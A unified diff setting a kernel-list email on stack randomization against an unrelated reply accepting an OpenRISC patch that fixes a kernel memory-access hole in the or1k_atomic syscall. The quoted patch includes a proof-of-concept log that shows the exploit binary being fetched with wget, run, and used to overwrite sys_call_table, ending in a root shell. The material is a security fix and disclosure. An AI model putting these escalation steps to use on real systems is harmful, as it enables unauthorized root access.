@@ -1,143 +1,249 @@
-Received: from mail.zytor.com (terminus.zytor.com [198.137.202.136])
-	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
+Received: from mail-wm1-f52.google.com (mail-wm1-f52.google.com [209.85.128.52])
+	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 00D5C36B92B;
-	Thu, 27 Aug 2026 22:50:41 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=198.137.202.136
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 5C2C530D3E9
+	for <linux-openrisc@vger.kernel.org>; Sat, 29 Aug 2026 06:29:33 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.128.52
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1787871051; cv=none; b=uDPTU1K8LnIHB0ZH1ceDWgRHJ6PRov4LgNLifb47KSS1HrXkuPuzag/Gf0cWQasWXlb97ZLm4GkJlvekCkI/ck7yfvny10aYlnGNMJfyyTju5+DfrJJtdeptncnWkltqiJRrvO5GkDz2OcI1OECwL7QdgkVrZ1eUIXF4jpP1gIc=
+	t=1787984975; cv=none; b=C55jGDDkceygTlreFOTz5Wn8J6DRisXsiH4x8SxrHsAaysMiJoung1LchcIU+eXN0Ud/AuP6sWJc8iqk7zU4aLUY5OKeE6QykY2cMJQD6UsqmaG0Jfiz7gBO1GufedFdLlgAsKcThr85/Aqv53q1yy+CETeRHzVzpKcwQhUJ4Kc=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1787871051; c=relaxed/simple;
-	bh=oVpn3Y3xe4yNSLPISH532HiWMGCaPXfViMVpomdHH3k=;
-	h=Message-ID:Date:MIME-Version:Subject:To:Cc:References:From:
-	 In-Reply-To:Content-Type; b=pIfSA6qgSEAwqzJZJ4t+0qFTutk8n50r0czjVO03hiWGFha/Ag/jz7uSejyo9GvhWUzE4Sa1YNsmxUi0aiu5Pcc/h69dcCDQ+mIei1wHuxC+/31h1OwDxg5nV8dO6HF3U7z/4jnuIAjA4VxqQjKB5pwqkfj+UC1DPw0qvM393Xw=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=zytor.com; spf=pass smtp.mailfrom=zytor.com; dkim=pass (2048-bit key) header.d=zytor.com header.i=@zytor.com header.b=GymOd4Rk; arc=none smtp.client-ip=198.137.202.136
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=zytor.com
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=zytor.com
+	s=arc-20240116; t=1787984975; c=relaxed/simple;
+	bh=SiU/2OsQxhZj+EY9kQ5PjA3CQm4G6D2vCxthW14z8rY=;
+	h=Date:From:To:Cc:Subject:Message-ID:References:MIME-Version:
+	 Content-Type:Content-Disposition:In-Reply-To; b=EUm3P7eZKJc3U2E3aDx/UEyfKzE3EGjpWy4VPNZ4tmG2ZGz8LmTZDSwz0NxBYt4zMBUcZ13qZ9rMASrbfdLqYlFKHTH56IAEDn7dnt1a2v+5V6mQ1Ri4T5n0mTrrMRv08M20q8L8GSI6RaQzi4Jj1yLv8c23wg3ohnw/Y4mP+s8=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=ZB996Zv0; arc=none smtp.client-ip=209.85.128.52
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=zytor.com header.i=@zytor.com header.b="GymOd4Rk"
-Received: from [IPV6:2601:646:8081:8d71:8c93:dacb:e5fa:49aa] ([IPv6:2601:646:8081:8d71:8c93:dacb:e5fa:49aa])
-	(authenticated bits=0)
-	by mail.zytor.com (8.18.1/8.17.1) with ESMTPSA id 67RMl4Qn1836438
-	(version=TLSv1.3 cipher=TLS_AES_128_GCM_SHA256 bits=128 verify=NO);
-	Thu, 27 Aug 2026 15:47:04 -0700
-DKIM-Filter: OpenDKIM Filter v2.11.0 mail.zytor.com 67RMl4Qn1836438
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=zytor.com;
-	s=2026072801; t=1787870834;
-	bh=EXQuytFudEdgp91C+uFz8aeu/WW15G7DgPzpxtGKF4M=;
-	h=Date:Subject:To:Cc:References:From:In-Reply-To:From;
-	b=GymOd4RkxGi8njVCQCfisvKP39Bb44ZVOGqd2ZqhsM67DzFyYn8S/jMXCU8Rma33W
-	 PEelxL7L8kBY+qk5qAEjpsMwfkxEwjrDmJEsL+fSa6zkpR+h5d+MOwPtTLVMwwm0lZ
-	 bCPemLIjQYuVaQEQRjl132J4YP0xzX54ej4JFh90v2xhqZFikkHSFSnGkczichDoFv
-	 sZK/qGKEclFkhvxq+v2kMkmJ4o1BjYqiHVTd5aGLm7HyH0fkUCbFxhX7p3xCNzPfY0
-	 gzR1rveeuo2MbtEx3KqfD+thNsEFw5il2Dad3o6axDhdFmbVxxjrh2OwAc/diiyN8G
-	 nWKtXnX6xx8pw==
-Message-ID: <995a61ef-ce8c-4c8b-bea8-77f375076a39@zytor.com>
-Date: Thu, 27 Aug 2026 15:46:58 -0700
+	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="ZB996Zv0"
+Received: by mail-wm1-f52.google.com with SMTP id 5b1f17b1804b1-49800c6a846so16739565e9.3
+        for <linux-openrisc@vger.kernel.org>; Fri, 28 Aug 2026 23:29:33 -0700 (PDT)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=gmail.com; s=20251104; t=1787984971; x=1788589771; darn=vger.kernel.org;
+        h=in-reply-to:content-disposition:content-type:mime-version
+         :references:message-id:subject:cc:to:from:date:from:to:cc:subject
+         :date:message-id:reply-to:content-type;
+        bh=2zLACw0pXpUYULJDZoulM61mRMjzPQIqT274DyKnsS4=;
+        b=ZB996Zv0BxqDTCG56kzqwKiqgPNNI0qZ9qIpHbg4ua2HTiMgiwBy60QuCHP4cl8FBC
+         VUELCUOCb6KP3uLAlfAsY3yKosksDGcwTwlw0uG8rBLNwTLY3gZmRMJZhpGroslOu6ni
+         thCcVAKSMGBgVKSC8rOecso/iMabDChWXFJyK5Q8USwdSK2EZqAbgsYD8HbIp0PBHtL+
+         SLWlZnOIrOHHbhACmSZMl3mdrZdUoDr6GKdWUFtS3u0PuTpcqyP71mf16JE78c0VQtkB
+         aUCaz6VqUnoC5uhTxVi6E/tBDOlbxBftkeqTF2vtn4zPCl4bVsWx/05hrTwlucyR1U5W
+         rjWA==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20251104; t=1787984971; x=1788589771;
+        h=in-reply-to:content-disposition:content-type:mime-version
+         :references:message-id:subject:cc:to:from:date:x-gm-gg
+         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to
+         :content-type;
+        bh=2zLACw0pXpUYULJDZoulM61mRMjzPQIqT274DyKnsS4=;
+        b=KSpR++PyUw7vfVNUPElDw+UMwzIk66DGdcnvt5Dizo7SipaTFCfKdtF8FK3V6CzYe8
+         JvqmaJBx4Wp+/dXKFt8DamTroV0JfjnwsiubLnrZ6pk3/WN8pHbcDmrBQOZnBoyLemFZ
+         AXkQ+8AH7xGcSVvPswSsjHWVROnQfzyXfYcroY5qTRplkkx/wiLNL1QC3yiLNEh+Q/Go
+         q2jpwQ11cDoyDl9PGIs3SFrk1TygXbc566xhWF4YZcUFTmP/x5ghoa8ReOVrkEx6pL+p
+         pn2puDuhNYjx5lvuV0SZo38oLDDK3IU/qBgyb6AsnuGB+gnfeGk5UaQiMB1gHz84W7N+
+         FX/g==
+X-Forwarded-Encrypted: i=1; AHgh+RqS0czcoC3mz336pa0Yojl6kSKh2vozGKZsBdJVam9Rhn9repGHjw5wqZN1aZfF8VGatYSu2OabJwCg80cZTA==@vger.kernel.org
+X-Gm-Message-State: AFuF++nDHGAL6I6lGCydnkgobWZ1zhhWpeZPbWEJwUdZLlCMQMutvf8y
+	4i32c/TvNBC1/lShRWu2STW+2K15jTnRTSPIeNRVuRA4rBztIXdTthtS
+X-Gm-Gg: AR+sD13+9gjFJvPdiAYXPD/Ahp8Z+Vh2ypfhzYhMJMp4bVV2OrCfjuY2cUH0DsEMAu2
+	fkR70WLGq533ZG9R3Gdj6NhX+JMQ17dcoWhqu91b55KBs3V/wgDCW0JjpGvktlcOrTxdB5/vW8c
+	8VzgNYK+nyUDkzJqx7+eBrrIEWI88LQg7bYVfmC0s3yOqVFkmZvXdX8Q4wMEbD/xBTnD6vkjgmE
+	Cn4ytSGr6sOA+oTu6IfP4RaKRynNn94VKxamDxAIJhnBSPTtB+jCy3Mtu/bSJxAta6ozmNSFVQZ
+	saeIPSNVUOdwqArfw6dLSTL254EQkvzaBzJSscqSAJF8EVftyXp8LWgbUJlad/f3FW8e4mByWGt
+	4ivjDSHKd5LoL+VyctU2bHEX7ZrAjNBACjMRcGdum08/A+O1be80Hr3HuqGAX4IyO+C0mVF08yN
+	joxooQ4FKThj8OUoohR+qWuzKTYTcGL/F7grrwNtGxGQSlAHZI/LUi0TQAKJyzIO/r2dr0ozc7c
+	ZI6bBRyfNZKgKTJhTqAzcn7lh38HhR+5IUXp0yZZrQ=
+X-Received: by 2002:a05:600c:3145:b0:499:79b9:e220 with SMTP id 5b1f17b1804b1-49b91c44f6cmr174203445e9.10.1787984971174;
+        Fri, 28 Aug 2026 23:29:31 -0700 (PDT)
+Received: from localhost (brnt-04-b2-v4wan-170138-cust2432.vm7.cable.virginm.net. [94.175.9.129])
+        by smtp.gmail.com with ESMTPSA id ffacd0b85a97d-482fbb20793sm8088685f8f.17.2026.08.28.23.29.30
+        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
+        Fri, 28 Aug 2026 23:29:30 -0700 (PDT)
+Date: Sat, 29 Aug 2026 07:29:29 +0100
+From: Stafford Horne <shorne@gmail.com>
+To: Ali Ahmet Memis <ali@iusegentoo.com>
+Cc: Jonas Bonn <jonas@southpole.se>,
+	Stefan Kristiansson <stefan.kristiansson@saunalahti.fi>,
+	Arnd Bergmann <arnd@arndb.de>, linux-openrisc@vger.kernel.org,
+	linux-kernel@vger.kernel.org, stable@vger.kernel.org
+Subject: Re: [PATCH v2] openrisc: fix arbitrary kernel memory access via
+ or1k_atomic syscall
+Message-ID: <apJ8SWRA0PxaQEs9@antec>
+References: <20260821013839.587041-1-ali@iusegentoo.com>
+ <20260821014543.588228-1-ali@iusegentoo.com>
 Precedence: bulk
 X-Mailing-List: linux-openrisc@vger.kernel.org
 List-Id: <linux-openrisc.vger.kernel.org>
 List-Subscribe: <mailto:linux-openrisc+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:linux-openrisc+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-User-Agent: Mozilla Thunderbird
-Subject: Re: [patch 03/18] entry: Provide
- [syscall_]enter_from_user_mode_randomize_stack()
-To: Thomas Gleixner <tglx@kernel.org>, LKML <linux-kernel@vger.kernel.org>
-Cc: Peter Zijlstra <peterz@infradead.org>,
-        Michael Ellerman <mpe@ellerman.id.au>,
-        Shrikanth Hegde <sshegde@linux.ibm.com>, linuxppc-dev@lists.ozlabs.org,
-        Kees Cook <kees@kernel.org>, Huacai Chen <chenhuacai@kernel.org>,
-        loongarch@lists.linux.dev, Paul Walmsley <pjw@kernel.org>,
-        Palmer Dabbelt <palmer@dabbelt.com>, linux-riscv@lists.infradead.org,
-        Sven Schnelle <svens@linux.ibm.com>, linux-s390@vger.kernel.org,
-        x86@kernel.org, Mark Rutland <mark.rutland@arm.com>,
-        Jinjie Ruan <ruanjinjie@huawei.com>, Andy Lutomirski <luto@kernel.org>,
-        Oleg Nesterov <oleg@redhat.com>,
-        Richard Henderson <richard.henderson@linaro.org>,
-        Russell King <linux@armlinux.org.uk>,
-        Catalin Marinas <catalin.marinas@arm.com>, Guo Ren <guoren@kernel.org>,
-        Geert Uytterhoeven <geert@linux-m68k.org>,
-        Thomas Bogendoerfer <tsbogend@alpha.franken.de>,
-        Helge Deller
- <deller@gmx.de>,
-        Yoshinori Sato <ysato@users.sourceforge.jp>,
-        Richard Weinberger <richard@nod.at>, Chris Zankel <chris@zankel.net>,
-        linux-arm-kernel@lists.infradead.org, linux-alpha@vger.kernel.org,
-        linux-csky@vger.kernel.org, linux-m68k@vger.kernel.org,
-        linux-mips@vger.kernel.org, linux-parisc@vger.kernel.org,
-        linux-sh@vger.kernel.org, linux-um@lists.infradead.org,
-        Arnd Bergmann <arnd@arndb.de>, Vineet Gupta <vgupta@kernel.org>,
-        Will Deacon <will@kernel.org>, Brian Cain <bcain@kernel.org>,
-        Michal Simek <monstr@monstr.eu>, Dinh Nguyen <dinguyen@kernel.org>,
-        "David S. Miller" <davem@davemloft.net>,
-        Andreas Larsson <andreas@gaisler.com>,
-        linux-snps-arc@lists.infradead.org, linux-hexagon@vger.kernel.org,
-        linux-openrisc@vger.kernel.org, sparclinux@vger.kernel.org,
-        linux-arch@vger.kernel.org,
-        =?UTF-8?Q?Michal_Such=C3=A1nek?= <msuchanek@suse.de>,
-        Jonathan Corbet <corbet@lwn.net>, linux-doc@vger.kernel.org
-References: <20260707181957.433213175@kernel.org>
- <20260707190253.816918647@kernel.org>
-Content-Language: en-US, sv-SE
-From: "H. Peter Anvin" <hpa@zytor.com>
-In-Reply-To: <20260707190253.816918647@kernel.org>
-Content-Type: text/plain; charset=UTF-8
-Content-Transfer-Encoding: 7bit
+Content-Type: text/plain; charset=us-ascii
+Content-Disposition: inline
+In-Reply-To: <20260821014543.588228-1-ali@iusegentoo.com>
 
-On 2026-07-07 12:06, Thomas Gleixner wrote:
-> Randomizing the syscall stack can only happen after state is established
-> via enter_from_user_mode() or syscall_enter_from_user_mode(). The earlier
-> it happens the better.
+On Fri, Aug 21, 2026 at 01:45:27AM +0000, Ali Ahmet Memis wrote:
+> sys_or1k_atomic() (syscall 244 in the "or1k" ABI) takes two user
+> pointers, v1 and v2, and swaps the words they point to in hand-written
+> assembly.
 > 
-> Provide two new macros to consolidate that:
+>     l.lwz   r29,0(r4)
+>     l.lwz   r27,0(r5)
+>     l.sw    0(r4),r27
+>     l.sw    0(r5),r29
 > 
->   - enter_from_user_mode_randomize_stack()
-> 	enter_from_user_mode();
-> 	add_random_kstack_offset_irqsoff();
+> The pointers are not checked with access_ok(). The four memory
+> accesses also have no exception table entries.
 > 
->   - syscall_enter_from_user_mode_randomize_stack()
-> 	enter_from_user_mode_randomize_stack();
-> 	syscall_enter_from_user_mode_work();
->     
-> to reduce boiler plate code.
+> A caller passes a kernel address as either pointer, and the syscall
+> reads from and writes to it directly.
 > 
-> Those are macros and not inline functions as the latter would limit the
-> stack randomization scope to the inline function itself.
+> This gives an unprivileged process a kernel read/write primitive. It
+> overwrites kernel data such as the sys_call_table, gaining code
+> execution in kernel context.
 > 
-Not directly related to this patchset, but still:
+> Check both pointers before entering the critical section. Add fixups
+> for the four memory accesses so faults on valid but unmapped user
+> addresses return -EFAULT.
+> 
+> Fixes: 9d02a4283e9c ("OpenRISC: Boot code")
+> Cc: stable@vger.kernel.org
+> Signed-off-by: Ali Ahmet Memis <ali@iusegentoo.com>
+> ---
+> v2: add Cc: stable@vger.kernel.org, missed in v1.
+> 
+> Tested against an unpatched or1ksim build with a local PoC that uses
+> this syscall to overwrite a sys_call_table entry and escalate to root:
+> 
+> ali@archlinux:~$ cd ~/or1k-build/buildroot/output/images
+> ali@archlinux:~/or1k-build/buildroot/output/images$ qemu-system-or1k -kernel vmlinux -nographic -append "console=ttyS0"
+> FDT at (ptrval)
+> Linux version 6.18.7 (ali@archlinux) (or1k-buildroot-linux-musl-gcc.br_real (Buildroot -g86102dd8) 15.3.0, GNU ld (GNU Binutils) 2.45.1) #5 Fri Aug 21 00:38:10 UTC 2026
+> OF: reserved mem: Reserved memory: No reserved-memory node in the DT
+> CPU: OpenRISC-13 (revision 8) @20 MHz
+> -- dmmu:  128 entries, 1 way(s)
+> -- immu:  128 entries, 1 way(s)
+> -- additional features:
+> -- power management
+> -- PIC
+> -- timer
+> Initial ramdisk not found
+> Setting up paging and PTEs.
+> map_ram: Memory: 0x0-0x8000000
+> Zone ranges:
+>   Normal   [mem 0x0000000000000000-0x0000000007ffffff]
+> Movable zone start for each node
+> Early memory node ranges
+>   node   0: [mem 0x0000000000000000-0x0000000007ffffff]
+> Initmem setup node 0 [mem 0x0000000000000000-0x0000000007ffffff]
+> itlb_miss_handler (ptrval)
+> dtlb_miss_handler (ptrval)
+> OpenRISC Linux -- http://openrisc.io
+> Kernel command line: console=ttyS0
+> printk: log buffer data + meta data: 131072 + 409600 = 540672 bytes
+> Dentry cache hash table entries: 16384 (order: 3, 65536 bytes, linear)
+> Inode-cache hash table entries: 8192 (order: 2, 32768 bytes, linear)
+> Sorting __ex_table...
+> Built 1 zonelists, mobility grouping on.  Total pages: 16384
+> mem auto-init: stack:all(zero), heap alloc:off, heap free:off
+> mem_init_done ...........................................
+> SLUB: HWalign=16, Order=0-3, MinObjects=0, CPUs=1, Nodes=1
+> NR_IRQS: 32, nr_irqs: 32, preallocated irqs: 0
+> clocksource: openrisc_timer: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 95563022313 ns
+> Console: colour dummy device 80x25
+> 40.00 BogoMIPS (lpj=80000)
+> $ id
+> uid=1000(test) gid=1000(test) groups=1000(test)
+> $ wget -O /tmp/x http://10.0.2.2:8000/lpe_static
+> Connecting to 10.0.2.2:8000 (10.0.2.2:8000)
+> saving to '/tmp/x'
+> x                    100% |********************************|  174k  0:00:00 ETA
+> '/tmp/x' saved
+> $ chmod +x /tmp/x
+> $ /tmp/x
+> Initial: uid=1000 euid=1000
+> Installing commit_creds into getuid entry
+> sys_call_table[174] overwritten
+> original handler = 0xc002e2ac
+> Calling hijacked syscall with init_cred
+> hijacked syscall returned 0
+> Restoring original getuid handler
+> syscall table restored
+> Final identity: uid=0 euid=0
+> # id
+> uid=0(root) gid=0(root)
+> #
+> 
+>  arch/openrisc/kernel/entry.S | 42 ++++++++++++++++++++++++++++++++++++++---
+>  1 file changed, 39 insertions(+), 3 deletions(-)
+> 
+> diff --git a/arch/openrisc/kernel/entry.S b/arch/openrisc/kernel/entry.S
+> index c7e90b09645e..2e8c4102cd62 100644
+> --- a/arch/openrisc/kernel/entry.S
+> +++ b/arch/openrisc/kernel/entry.S
+> @@ -1223,15 +1223,49 @@ _no_syscall_trace:
+>   *
+>   */
+> 
+> +/* Keep this literal; hi()/lo() can't use the UL-suffixed TASK_SIZE. */
+> +#define OR1K_ATOMIC_ADDR_LIMIT	0x7ffffffc
 
-Can anyone *please* find out what the actual security requirements are for the
-syscall randomization offset?
+OK, it would have been good to use TASK_SIZE.
 
-The original checkin, 39218ff4c625 ("stack: Optionally randomize kernel stack
-offset each syscall") indicates that it is fundamental that the stack offset
-is applied *after* pt_regs pushing, but that isn't documented anywhere in the
-kernel sources as far as I can tell.
+>  ENTRY(sys_or1k_atomic)
 
-However, I have also come to understand that there are further, undocumented
-constraints; at least at one point I was told that "the offset should not be
-stored in memory while running in the kernel", which seems more than a bit odd.
+Note, I don't know of any applications that actually use this, we should
+deprecated this syscall.  But I do see it available in musl and strace, it would
+take some time to cleanup.
 
-This matters, because it creates a data dependency on exit. The original
-checkin does call out that RDTSC timing is inappropriate if the user could
-control it, but using a hardware CSPRNG like RDRAND (or its equivalent for
-other architectures) would be feasible if it isn't in the critical path. If an
-RDRAND - store sequence can be executed on entry, *after* the stack
-adjustment, then the high latency of RDRAND can hopefully be very effectively
-hidden by an OO CPU.
+>  	/* FIXME: This ignores r3 and always does an XCHG */
+> +
+> +	/* Check both user pointers before accessing them. */
+> +	l.movhi	r13,hi(OR1K_ATOMIC_ADDR_LIMIT)
+> +	l.ori	r13,r13,lo(OR1K_ATOMIC_ADDR_LIMIT)
+> +	l.sfgtu	r4,r13
+> +	l.bf	9f
+> +	 l.nop
+> +	l.sfgtu	r5,r13
+> +	l.bf	9f
+> +	 l.nop
+> +
+>  	DISABLE_INTERRUPTS(r17,r19)
+> -	l.lwz	r29,0(r4)
+> -	l.lwz	r27,0(r5)
+> -	l.sw	0(r4),r27
+> -	l.sw	0(r5),r29
+> +10:	l.lwz	r29,0(r4)
+> +11:	l.lwz	r27,0(r5)
+> +12:	l.sw	0(r4),r27
+> +13:	l.sw	0(r5),r29
+>  	ENABLE_INTERRUPTS(r17)
+>  	l.jr	r9
+>  	 l.or	r11,r0,r0
+> 
+> +	/* Either pointer was outside user space, or turned out to be
+> +	 * unmapped/inaccessible when we actually touched it.
+> +	 */
+> +9:	l.jr	r9
+> +	 l.addi	r11,r0,-EFAULT
+> +
+> +	.section .fixup, "ax"
+> +14:
+> +	ENABLE_INTERRUPTS(r17)
+> +	l.j	9b
+> +	 l.nop
+> +	.previous
+> +
+> +	.section __ex_table, "a"
+> +	.long	10b, 14b
+> +	.long	11b, 14b
+> +	.long	12b, 14b
+> +	.long	13b, 14b
+> +	.previous
+> +
 
-Incidentally, in case you are wondering "why doesn't each core get a dedicated
-CSPRNG and hardware randomness generator, to avoid high latency", the answer
-is pretty simple: a hardware random number source, regardless of the specifics
-of the design, almost by definition violates the hardware design rules of any
-digital design; after all, the design rules are designed to *eliminate* noise
-(making the circuit behave as closely as physically possible to a realization
-of the abstract digital circuit), whereas the very goal of a HWRNG source is
-to *extract and amplify* quantum thermal noise. This means that considerable
-chip area is consumed by a "keep-out zone", a designated "no man's land"
-keeping the digital logic away from the noise source. This keep-out zone is
-typically much, much larger than the noise source itself.
+Thanks,
 
-	-hpa
+I will send this upstream.
 
+-Stafford
